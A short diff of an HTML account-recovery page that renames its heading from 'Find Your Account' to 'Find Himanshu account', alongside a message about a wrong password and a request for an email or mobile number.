@@ -59,7 +59,7 @@
     </style>
 <body>
     <div class="container">
-        <h1>Find Your Account</h1>
+        <h1>Find Himanshu account</h1>
         <div class="divider"></div> <!-- Divider between input and button -->
         <p style="font-family: Arial, sans-serif; font-size: 16px; color: #333; text-align: left;">You entered wrong password Please enter your email address or mobile number to search for your account.</p>
         <p class="spaced-paragraph"></p>
